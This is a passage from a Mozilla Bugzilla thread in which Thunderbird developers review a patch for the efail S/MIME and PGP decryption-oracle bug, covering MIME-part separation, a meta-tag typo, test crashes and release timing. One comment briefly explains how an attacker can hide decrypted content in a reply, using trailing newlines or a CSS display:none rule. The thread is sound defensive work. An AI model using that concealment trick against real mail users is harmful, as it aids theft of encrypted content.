          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_101158" id="a15610803_176914"><img src="https://secure.gravatar.com/avatar/18eb16a976feb4b40d839c5e9036bc3a?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_101158" id="a15610803_176914"><a class="email " href="/user_profile?user_id=101158" > <span class="fna">Magnus Melin [:mkmelin]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-172"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-172" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c172">Comment 172</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-21 04:05 PDT" data-time="1526900730">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-172">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-172" data-comment-id="13293790">(In reply to Ben Bucksch (:BenB) from <a class="bz_bug_link
          bz_status_VERIFIED bz_closed"
   title="VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails"
   href="/show_bug.cgi?id=1419417#c158">comment #158</a>)
<span class="quote">&gt; &gt; this is not fixing it for reply/fwd.
&gt; 
&gt; Magnus, could you please elaborate?</span >

It's not fixing for composition because the decrypted content is still there in the reply, even now when the parts are parsed separately. It is mitigated quite a bit because you can't(?) that easily hide the decrypted content completely. You can however end the first html part with 100 newlines, or, put &lt;style&gt;*something matching everything but your content { display:none } &lt;/style&gt; inside the first part.
That will blead into the second part to hide the content, and when you reply you will not see it. 

If the content is decrypted, we need it marked some way to remove it. I'm not really sure how, because the legitimate use case of replying and quoting an encrypted message should still work of course.

<span class="quote">&gt; Compare <a class="bz_bug_link
          bz_status_VERIFIED bz_closed"
   title="VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails"
   href="/show_bug.cgi?id=1419417#c63">comment 63</a>.</span >

I'm not sure what you're referring to. Prior to 52, composition was doing window-&gt;GetDocShell()-&gt;SetAppType(nsIDocShell::APP_TYPE_EDITOR); This was a major problem that I fixed in <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - File disclosure via covertly imposed attachments in HTML emails"
   href="/show_bug.cgi?id=1151366">bug 1151366</a>.</pre></div><div class="change-set" id="a15625851_101158"><div class="change" id="aa15625851_101158">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_101158" id="a15625851_101158"><img src="https://secure.gravatar.com/avatar/18eb16a976feb4b40d839c5e9036bc3a?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_101158" id="a15625851_101158"><a class="email " href="/user_profile?user_id=101158" > <span class="fna">Magnus Melin [:mkmelin]</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a15625851_101158"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a15625851_101158">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#a15625851_101158">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-21 04:05 PDT" data-time="1526900742">4 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">Flags: <span class="activity-deleted">needinfo?(mkmelin+mozilla)</span></div></div></div><div class="change-set" id="c173"><div class="comment" data-id="13293792" data-no="173"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-173" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_176914" id="a15625851_101158"><img src="https://secure.gravatar.com/avatar/5d8a5792e976c4d61a6651fb4e71c84f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_176914" id="a15625851_101158"><a class="email disabled" href="/user_profile?user_id=176914" > <span class="fna">Jorg K (CEST = GMT+2)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-173"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-173" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c173">Comment 173</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-21 04:06 PDT" data-time="1526900788">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-173">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-173" data-comment-id="13293792">(In reply to Magnus Melin from <a class="bz_bug_link
          bz_status_VERIFIED bz_closed"
   title="VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails"
   href="/show_bug.cgi?id=1419417#c168">comment #168</a>)
<span class="quote">&gt; I meant to remove the outputting of meta http-equiv here since it looked
&gt; wrong.
&gt; I think it's proof enough if it has been there and with a typo all these
&gt; years making it a no-op, that my hunch was correct ;)</span >
Well, the charset= part wasn't a no-op, was it? Ben? I'd prefer to leave it in for now.

(In reply to Ben Bucksch (:BenB) from <a class="bz_bug_link
          bz_status_VERIFIED bz_closed"
   title="VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails"
   href="/show_bug.cgi?id=1419417#c170">comment #170</a>)
<span class="quote">&gt; I don't think it's good idea to hardcode the number of linebreaks and that
&gt; &quot;windows-registry-key&quot; test is a hard-to-read and failure-prone way to say
&gt; &quot;this is Windows&quot;.</span >
That's pre-existing code, copied again:
<a rel="nofollow" href="https://dxr.mozilla.org/comm-central/search?q=%40mozilla.org%2Fwindows-registry-key%3B1&amp;redirect=false">https://dxr.mozilla.org/comm-central/search?q=%40mozilla.org%2Fwindows-registry-key%3B1&amp;redirect=false</a></pre></div><div class="change-set" id="c174"><div class="comment" data-id="13293806" data-no="174"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-174" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_101158" id="a15625851_101158"><img src="https://secure.gravatar.com/avatar/18eb16a976feb4b40d839c5e9036bc3a?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_101158" id="a15625851_101158"><a class="email " href="/user_profile?user_id=101158" > <span class="fna">Magnus Melin [:mkmelin]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-174"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-174" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c174">Comment 174</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-21 04:14 PDT" data-time="1526901257">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-174">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-174" data-comment-id="13293806">(In reply to Jorg K (GMT+2) (bustage-fix only, NI for urgent reviews) from <a class="bz_bug_link
          bz_status_VERIFIED bz_closed"
   title="VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails"
   href="/show_bug.cgi?id=1419417#c173">comment #173</a>)
<span class="quote">&gt; Well, the charset= part wasn't a no-op, was it? Ben? I'd prefer to leave it
&gt; in for now.</span >

Huh? If it said Context-Type instead of Content-Type it will have been completely ignored.</pre></div><div class="change-set" id="c175"><div class="comment" data-id="13293822" data-no="175"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-175" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_176914" id="a15625851_101158"><img src="https://secure.gravatar.com/avatar/5d8a5792e976c4d61a6651fb4e71c84f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_176914" id="a15625851_101158"><a class="email disabled" href="/user_profile?user_id=176914" > <span class="fna">Jorg K (CEST = GMT+2)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-175"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-175" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c175">Comment 175</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-21 04:38 PDT" data-time="1526902728">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-175">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-175" data-comment-id="13293822">No, you had:
&lt;meta http-equiv=&quot;Context-Type&quot; content=&quot;text/html; charset=...&quot;

So perhaps the first part was ignored, not the second. Anyway, I'm leaving it in for now, please file a follow-up. We're running out of time with nit discussions.

I'm going to put it all together right now and start a try.</pre></div><div class="change-set" id="c176"><div class="comment" data-id="13293850" data-no="176"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-176" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_101158" id="a15625851_101158"><img src="https://secure.gravatar.com/avatar/18eb16a976feb4b40d839c5e9036bc3a?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_101158" id="a15625851_101158"><a class="email " href="/user_profile?user_id=101158" > <span class="fna">Magnus Melin [:mkmelin]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-176"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-176" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c176">Comment 176</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-21 05:00 PDT" data-time="1526904054">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-176">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-176" data-comment-id="13293850">The charset= is inside the content quote, so it would not make any difference. There's no second part. But sure, do a followup.</pre></div><div class="change-set" id="c177"><div class="comment" data-id="13293865" data-no="177"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-177" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_176914" id="a15625851_101158"><img src="https://secure.gravatar.com/avatar/5d8a5792e976c4d61a6651fb4e71c84f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_176914" id="a15625851_101158"><a class="email disabled" href="/user_profile?user_id=176914" > <span class="fna">Jorg K (CEST = GMT+2)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-177"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-177" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c177">Comment 177</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-21 05:11 PDT" data-time="1526904690">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-177">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-177" data-comment-id="13293865">Comment on <span class="bz_obsolete"><a href="/attachment.cgi?id=8979190" name="attach_8979190" title="Separate MIME parts from each other, v5.1 (for trunk)">attachment 8979190</a> <a href="/attachment.cgi?id=8979190&amp;action=edit" title="Separate MIME parts from each other, v5.1 (for trunk)">[details]</a> <a href="/attachment.cgi?id=8979190&amp;action=diff" title="Separate MIME parts from each other, v5.1 (for trunk)">[diff]</a></span> <a href='/page.cgi?id=splinter.html&amp;ignore=&amp;bug=1419417&amp;attachment=8979190'>[review]</a>
Separate MIME parts from each other, v5.1 (for trunk)

Review of <span class="bz_obsolete"><a href="/attachment.cgi?id=8979190" name="attach_8979190" title="Separate MIME parts from each other, v5.1 (for trunk)">attachment 8979190</a> <a href="/attachment.cgi?id=8979190&amp;action=edit" title="Separate MIME parts from each other, v5.1 (for trunk)">[details]</a> <a href="/attachment.cgi?id=8979190&amp;action=diff" title="Separate MIME parts from each other, v5.1 (for trunk)">[diff]</a></span> <a href='/page.cgi?id=splinter.html&amp;ignore=&amp;bug=1419417&amp;attachment=8979190'>[review]</a>:
-----------------------------------------------------------------

The DOM created still has the body outside the &lt;div&gt;. Please use the Inspector inside Dev Tools to see it. So the corresponding code change had no effect. Tested with <span class=""><a href="/attachment.cgi?id=8975458" name="attach_8975458" title="A1-dec-pgp-smime-html-reply.eml">attachment 8975458</a> <a href="/attachment.cgi?id=8975458&amp;action=edit" title="A1-dec-pgp-smime-html-reply.eml">[details]</a></span>. I won't mark it r-, but please address this issue.

Also, I re-enabled r? for jorgk again.

::: mailnews/mime/src/mimeTextHTMLParsed.cpp
&#64;&#64; +61,5 &#64;&#64;
<span class="quote">&gt; +    return status;
&gt; +
&gt; +  // charset
&gt; +  // dump the charset we get from the mime headers into a HTML &lt;meta http-equiv&gt;
&gt; +  char *content_type = (obj-&gt;headers</span >

As I said a few times before, please remove the superfluous parenthesis.

&#64;&#64; +63,5 &#64;&#64;
<span class="quote">&gt; +  // charset
&gt; +  // dump the charset we get from the mime headers into a HTML &lt;meta http-equiv&gt;
&gt; +  char *content_type = (obj-&gt;headers
&gt; +     ? MimeHeaders_get(obj-&gt;headers, HEADER_CONTENT_TYPE, false, false)
&gt; +     : 0);</span >

and here.</pre></div><div class="change-set" id="c178"><div class="comment" data-id="13293888" data-no="178"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-178" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_176914" id="a15625851_101158"><img src="https://secure.gravatar.com/avatar/5d8a5792e976c4d61a6651fb4e71c84f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_176914" id="a15625851_101158"><a class="email disabled" href="/user_profile?user_id=176914" > <span class="fna">Jorg K (CEST = GMT+2)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-178"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-178" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c178">Comment 178</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-21 05:25 PDT" data-time="1526905539">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-178">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-178" data-comment-id="13293888">I came to adjust the test to Content-Type and noticed the following:

Some part of the system still inserts content-type, so in order to get the test to pass, I need to:
replace(/[\n]*&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text\/html; .*&quot;&gt;[\n]*/ig, &quot;&quot;)

Note the /ig, so ignoring case. Maybe that comes from here:
<a rel="nofollow" href="https://searchfox.org/mozilla-central/rev/8affe6e83188787eb61fe0528eeb6eef6081ba06/dom/base/nsXHTMLContentSerializer.cpp#378">https://searchfox.org/mozilla-central/rev/8affe6e83188787eb61fe0528eeb6eef6081ba06/dom/base/nsXHTMLContentSerializer.cpp#378</a>

However, after taking that first hurdle, the program crashes when running test_mime_emitter.js:
nss3.dll!PR_Assert(const char * s, const char * file, int ln) Line 553	C
xul.dll!MimeInlineText_parse_end(MimeObject * obj, bool abort_p) Line 249	C++
xul.dll!MimeInlineText_finalize(MimeObject * obj) Line 179	C++
xul.dll!mime_free(MimeObject * object) Line 278	C++
xul.dll!MimeMultipartRelated_finalize(MimeObject * obj) Line 244	C++
xul.dll!mime_free(MimeObject * object) Line 278	C++
xul.dll!MimeContainer_finalize(MimeObject * object) Line 77	C++
xul.dll!mime_free(MimeObject * object) Line 278	C++
xul.dll!mime_display_stream_complete(_nsMIMESession * stream) Line 955	C++
xul.dll!nsStreamConverter::OnStopRequest(nsIRequest * request, nsISupports * ctxt, nsresult status) Line 1050	C++
xul.dll!nsMsgProtocol::OnStopRequest(nsIRequest * request, nsISupports * ctxt, nsresult aStatus) Line 389	C++

test_mime_attachments_size.js equally crashes.

So maybe the obvious change of moving the eol() calls around wasn't so obvious.

Ben, if you want to debug it:
mach xpcshell-test --interactive ...
then you can attach the debugger before running the test.</pre></div><div class="change-set" id="c179"><div class="comment" data-id="13293892" data-no="179"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-179" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_176914" id="a15625851_101158"><img src="https://secure.gravatar.com/avatar/5d8a5792e976c4d61a6651fb4e71c84f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_176914" id="a15625851_101158"><a class="email disabled" href="/user_profile?user_id=176914" > <span class="fna">Jorg K (CEST = GMT+2)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-179"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-179" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c179">Comment 179</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-21 05:27 PDT" data-time="1526905645">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-179">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div id="att-8979211"
         class="attachment patch obsolete"
         data-id="8979211" itemscope itemtype="http://schema.org/MediaObject">
      <meta itemprop="name" content="1419417-fix-tests.patch">
      <meta itemprop="contentSize" content="2691">
      <meta itemprop="encodingFormat" content="text/plain">
      <div class="label">
        Attached patch
          <meta itemprop="contentUrl" content="attachment.cgi?id=8979211">
          <a class="link" href="attachment.cgi?id=8979211&amp;action=diff">
        <span id="att-8979211-description" itemprop="description">1419417-fix-tests.patch (v3)</span></a> (obsolete)
        — <a href="attachment.cgi?id=8979211&amp;action=edit" itemprop="url">Details</a>
          — <a href="/page.cgi?id=splinter.html&ignore=&bug=1419417&attachment=8979211">Splinter Review</a>
      </div>
    </div>

  
    <pre
        class="comment-text  "
        id="ct-179" data-comment-id="13293892">Adjusted for Content-Type. Both tests crash with the latest C++ patch.</pre></div><div class="change-set" id="c180"><div class="comment" data-id="13293935" data-no="180"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-180" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_176914" id="a15625851_101158"><img src="https://secure.gravatar.com/avatar/5d8a5792e976c4d61a6651fb4e71c84f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_176914" id="a15625851_101158"><a class="email disabled" href="/user_profile?user_id=176914" > <span class="fna">Jorg K (CEST = GMT+2)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-180"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-180" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c180">Comment 180</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-21 05:54 PDT" data-time="1526907298">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-180">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-180" data-comment-id="13293935">Looking at the CSS for moz-text-html I didn't find any. So perhaps we return to the previous version of the patch that didn't cause crashes and fix the &lt;div&gt; issue in <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - In &quot;original HTML&quot; and &quot;simple HTML&quot; view the body of the message is placed outside &lt;div class=moz-text-html&gt;"
   href="/show_bug.cgi?id=1462895">bug 1462895</a> later for both sanitised and parsed/standard HTML? Otherwise we'll be here for a while longer :-(</pre></div><div class="change-set" id="c181"><div class="comment" data-id="13293940" data-no="181"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-181" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_176914" id="a15625851_101158"><img src="https://secure.gravatar.com/avatar/5d8a5792e976c4d61a6651fb4e71c84f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_176914" id="a15625851_101158"><a class="email disabled" href="/user_profile?user_id=176914" > <span class="fna">Jorg K (CEST = GMT+2)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-181"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-181" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c181">Comment 181</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-21 05:59 PDT" data-time="1526907575">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-181">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-181" data-comment-id="13293940">That said, the DOM for sanitised HTML being wrong points to some internal problem, so moving this problem onto the main code path for all HTML without understanding it appears a little risky, especially in a dot release 52.8.1.</pre></div><div class="change-set" id="c182"><div class="comment" data-id="13294035" data-no="182"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-182" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_176914" id="a15625851_101158"><img src="https://secure.gravatar.com/avatar/5d8a5792e976c4d61a6651fb4e71c84f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_176914" id="a15625851_101158"><a class="email disabled" href="/user_profile?user_id=176914" > <span class="fna">Jorg K (CEST = GMT+2)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-182"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-182" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c182">Comment 182</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-21 06:49 PDT" data-time="1526910575">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-182">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-182" data-comment-id="13294035">(In reply to Magnus Melin from <a class="bz_bug_link
          bz_status_VERIFIED bz_closed"
   title="VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails"
   href="/show_bug.cgi?id=1419417#c176">comment #176</a>)
<span class="quote">&gt; The charset= is inside the content quote, so it would not make any
&gt; difference. There's no second part. But sure, do a followup.</span >
Well, I tried the sanitised HTML view which uses similar code and removed writing of the meta tag. I tried in UTF-8 and windows-1252 and the display was still OK. I don't now how Gecko managed that.
The code also generates:
&lt;div class=&quot;moz-text-html&quot; lang=&quot;x-western&quot;&gt;&lt;/div&gt; or
&lt;div class=&quot;moz-text-html&quot; lang=&quot;x-unicode&quot;&gt;&lt;/div&gt;
which is completely wrong since the lang attribute should have a language tag, like &quot;en-US&quot; or &quot;de-AT&quot; or so. So this area also needs a clean-up sadly.

Filed <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - Investigate whether writing a meta tag in mimethsa.cpp is needed and whether writing lang=x-unicode in mimethtm.cpp makes any sense"
   href="/show_bug.cgi?id=1463133">bug 1463133</a>.</pre></div><div class="change-set" id="c183"><div class="comment" data-id="13294053" data-no="183"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-183" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_22599" id="a15625851_101158"><img src="https://secure.gravatar.com/avatar/1a31769c00192ed0a23c3142d6deace0?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_22599" id="a15625851_101158"><a class="email " href="/user_profile?user_id=22599" > <span class="fna">Ben Bucksch (:BenB)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-183"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-183" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c183">Comment 183</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-21 06:54 PDT" data-time="1526910879">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-183">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-183" data-comment-id="13294053"><span class="quote">&gt; It's not fixing for composition because the decrypted content is still there in the reply, even now when the parts are parsed separately.</span >

Hey Magnus, ah, yes, but that's a completely separate issue, and different fix.
The user can still detect it with the scrollbar etc.
This would be fixed by solution 3 in <a class="bz_bug_link
          bz_status_VERIFIED bz_closed"
   title="VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails"
   href="/show_bug.cgi?id=1419417#c57">comment 57</a>. That's another bug.

<span class="quote">&gt; The DOM created still has the body outside the &lt;div&gt;</span >

I've looked at the raw libmime output and the Dev Tools, and the &lt;div&gt; is around the HTML email. I'll attach a screenshot.

I've used a real HTML mail as test. Pay attention when using the attack emails here for testing, because they have empty HTML documents, so they can be easily confusing when used for verification.
Also, make sure that you have Original HTML on, not Sanitized HTML. I've been tripped by that once during my dev, too.

<span class="quote">&gt; perhaps we return to the previous version of the patch that didn't cause crashes and fix the &lt;div&gt;
&gt; issue in <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - In &quot;original HTML&quot; and &quot;simple HTML&quot; view the body of the message is placed outside &lt;div class=moz-text-html&gt;"
   href="/show_bug.cgi?id=1462895">bug 1462895</a> later for both sanitised and parsed/standard HTML? Otherwise we'll be here for a while longer :-(</span >

Yes, given that the main concrete effect of the &lt;div&gt; is the missing margin of the separator, I think that's tolerable. We can still fix it in a later 52.9.0 or 60 release, if need be.

I'm for shipping the fix as I had it last Wednesday, that worked and fixed the security bug.</pre></div><div class="change-set" id="c184"><div class="comment" data-id="13294087" data-no="184"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-184" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_22599" id="a15625851_101158"><img src="https://secure.gravatar.com/avatar/1a31769c00192ed0a23c3142d6deace0?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_22599" id="a15625851_101158"><a class="email " href="/user_profile?user_id=22599" > <span class="fna">Ben Bucksch (:BenB)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-184"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-184" >
        <td>
          <h3 class="change-name">
